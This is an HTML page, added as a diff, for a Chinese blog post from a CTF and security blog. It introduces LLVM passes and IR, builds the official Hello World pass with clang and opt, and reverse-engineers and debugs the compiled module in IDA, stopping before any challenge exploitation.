@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;240748 0x00 前言从红帽杯的simpleVM一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。 0x01 LLVM PASSPass就是“遍历一遍IR，可以同时对它做一些操作”的意思。LLVM的核心库中会给你一些 Pass类 去继承。你需要实现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LLVM PASS PWN">
+<meta property="og:url" content="https://github.com/ha1vk/2021/05/28/llvm-pass-pwn/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;240748 0x00 前言从红帽杯的simpleVM一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。 0x01 LLVM PASSPass就是“遍历一遍IR，可以同时对它做一些操作”的意思。LLVM的核心库中会给你一些 Pass类 去继承。你需要实现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01323ff233ba14df8c.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t011648c3b2baaa1b6f.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t019ef96c50281b9b48.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0199805ad5915848d2.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0174bb3094a483b8f2.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01bab2e094e6defb98.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01dffebcf98ad099ac.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t017d4c9fddd1070de3.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0182db0283a4d1a93e.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01b86d228280cb4d46.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t018166487d78e76506.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t011efea09ab4c80f42.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01521200b12176114f.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01955f98443fefee6f.png">
+<meta property="article:published_time" content="2021-05-28T02:30:45.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:59:20.339Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="LLVM PASS">
+<meta property="article:tag" content="编译器">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p2.ssl.qhimg.com/t01323ff233ba14df8c.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/05/28/llvm-pass-pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>LLVM PASS PWN | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/05/28/llvm-pass-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LLVM PASS PWN
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-28 10:30:45" itemprop="dateCreated datePublished" datetime="2021-05-28T10:30:45+08:00">2021-05-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:59:20" itemprop="dateModified" datetime="2025-06-26T17:59:20+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240748">https://www.anquanke.com/post/id/240748</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>从红帽杯的<code>simpleVM</code>一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。</p>
+<h2 id="0x01-LLVM-PASS"><a href="#0x01-LLVM-PASS" class="headerlink" title="0x01 LLVM PASS"></a>0x01 LLVM PASS</h2><p>Pass就是“遍历一遍IR，可以同时对它做一些操作”的意思。<br>LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。</p>
+<p>LLVM Pass有什么用呢？<br>1.显然它的一个用处就是插桩，在Pass遍历LLVM IR的同时，自然就可以往里面插入新的代码。<br>2.机器无关的代码优化：大家如果还记得编译原理的知识的话，应该知道IR在被翻译成机器码前会做一些机器无关的优化。 但是不同的优化方法之间需要解耦，所以自然要各自遍历一遍IR，实现成了一个个LLVM Pass。 最终，基于LLVM的编译器会在前端生成LLVM IR后调用一些LLVM Pass做机器无关优化， 然后再调用LLVM后端生成目标平台代码。<br>3.等等</p>
+<h2 id="0x02-LLVM-IR"><a href="#0x02-LLVM-IR" class="headerlink" title="0x02 LLVM IR"></a>0x02 LLVM IR</h2><p>传给LLVM PASS进行优化的数据是LLVM IR，即代码的中间表示，LLVM IR有三种表示形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、.ll 格式：人类可以阅读的文本。</span><br><span class="line">2、.bc 格式：适合机器存储的二进制文件。</span><br><span class="line">3、内存表示</span><br></pre></td></tr></table></figure>
+<p>从对应格式转化到另一格式的命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>
+<p>如下是我们的一个简易程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char name[0x10];</span><br><span class="line">   read(0,name,0x10);</span><br><span class="line">   write(1,name,0x10);</span><br><span class="line">   printf(&quot;bye\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S main.c -o main.ll</span><br></pre></td></tr></table></figure>
+<p>可以生成IR文本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;main.c&#x27;</span><br><span class="line">source_filename = &quot;main.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [5 x i8] c&quot;bye\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define i32 @main() #0 &#123;</span><br><span class="line">  %1 = alloca [16 x i8], align 16</span><br><span class="line">  %2 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0</span><br><span class="line">  %3 = call i64 @read(i32 0, i8* %2, i64 16)</span><br><span class="line">  %4 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0</span><br><span class="line">  %5 = call i64 @write(i32 1, i8* %4, i64 16)</span><br><span class="line">  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @read(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare i64 @write(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>从中可以看到IR中间代码表示的非常直观易懂，而LLVM PASS就是用于处理IR，将一些能够优化掉的语句进行优化。</p>
+<h2 id="0x03-编写一个简单的LLVM-PASS"><a href="#0x03-编写一个简单的LLVM-PASS" class="headerlink" title="0x03 编写一个简单的LLVM PASS"></a>0x03 编写一个简单的LLVM PASS</h2><p>从官方文档里，我们可以找到一个简易的示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;llvm/Pass.h&quot;</span><br><span class="line">#include &quot;llvm/IR/Function.h&quot;</span><br><span class="line">#include &quot;llvm/Support/raw_ostream.h&quot;</span><br><span class="line">#include &quot;llvm/IR/LegacyPassManager.h&quot;</span><br><span class="line">#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  struct Hello : public FunctionPass &#123;</span><br><span class="line">    static char ID;</span><br><span class="line">    Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line">    bool runOnFunction(Function &amp;F) override &#123;</span><br><span class="line">      errs() &lt;&lt; &quot;Hello: &quot;;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\n&#x27;;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char Hello::ID = 0;</span><br><span class="line"></span><br><span class="line">// Register for opt</span><br><span class="line">static RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);</span><br><span class="line"></span><br><span class="line">// Register for clang</span><br><span class="line">static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,</span><br><span class="line">  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span><br><span class="line">    PM.add(new Hello());</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+<p>该示例用于遍历IR中的函数，因此结构体<code>Hello</code>继承了<code>FunctionPass </code>，并重写了<code>runOnFunction</code>函数，那么每遍历到一个函数时，<code>runOnFunction</code>都会被调用，因此该程序会输出函数名。为了测试，我们需要将其编译为模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
+<p>然后我们以前面那个简易程序的IR为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.ll</span><br><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure>
+<p>其中参数中的<code>-hello</code>是我们在代码中注册的名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Register for opt</span><br><span class="line">static RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);</span><br></pre></td></tr></table></figure>
+<p>现在，我们在前面基础上加入对函数中的代码进行遍历的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;llvm/Pass.h&quot;</span><br><span class="line">#include &quot;llvm/IR/Function.h&quot;</span><br><span class="line">#include &quot;llvm/Support/raw_ostream.h&quot;</span><br><span class="line">#include &quot;llvm/IR/LegacyPassManager.h&quot;</span><br><span class="line">#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  struct Hello : public FunctionPass &#123;</span><br><span class="line">    static char ID;</span><br><span class="line">    Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line">    bool runOnFunction(Function &amp;F) override &#123;</span><br><span class="line">      errs() &lt;&lt; &quot;Hello: &quot;;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\n&#x27;;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();</span><br><span class="line">      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();</span><br><span class="line">         for(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            errs() &lt;&lt; &quot;opcode=&quot; &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; &quot; NumOperands=&quot; &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; &quot;\n&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char Hello::ID = 0;</span><br><span class="line"></span><br><span class="line">// Register for opt</span><br><span class="line">static RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);</span><br><span class="line"></span><br><span class="line">// Register for clang</span><br><span class="line">static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,</span><br><span class="line">  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span><br><span class="line">    PM.add(new Hello());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>然后以同样的方式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.ll</span><br><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">opcode=alloca NumOperands=1</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=call NumOperands=2</span><br><span class="line">opcode=ret NumOperands=1</span><br></pre></td></tr></table></figure>
+<p>可以看到成功遍历出了函数中的指令操作</p>
+<h2 id="0x04-LLVM-PASS模块逆向分析"><a href="#0x04-LLVM-PASS模块逆向分析" class="headerlink" title="0x04 LLVM PASS模块逆向分析"></a>0x04 LLVM PASS模块逆向分析</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>现在，我们将<code>LLVMHello.so</code>模块放入IDA进行静态分析<br>在初始化函数，调用了函数进行对象的创建<br><img src="https://p2.ssl.qhimg.com/t01323ff233ba14df8c.png"><br>该函数如下<br><img src="https://p5.ssl.qhimg.com/t011648c3b2baaa1b6f.png"><br>我们需要关注一下虚表结构，这样才方便我们确定各函数的位置<br><img src="https://p0.ssl.qhimg.com/t019ef96c50281b9b48.png"><br>可以看到<code>runOnFunction</code>函数位于虚表中的最后一个位置，并且由于<code>runOnFunction</code>函数被我们重写，其指向的是我们自定义的那个函数,由此我们跟进<br><img src="https://p5.ssl.qhimg.com/t0199805ad5915848d2.png"><br>可以看到这正是我们重写的<code>runOnFunction</code>函数，因此对于LLVM PASS，定位函数的位置因从虚表入手。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>由于模块是动态加载的，并且运行时也不会暂停下来等我们用调试器去<code>Attach</code>，因此我们可以直接使用IDA来进行调试，其参数设置如下<br><img src="https://p0.ssl.qhimg.com/t0174bb3094a483b8f2.png"><br>在模块需要调试的地方设置断点，然后使用IDA来启动<code>opt</code>程序即可进行模块的调试<br><img src="https://p3.ssl.qhimg.com/t01bab2e094e6defb98.png"></p>
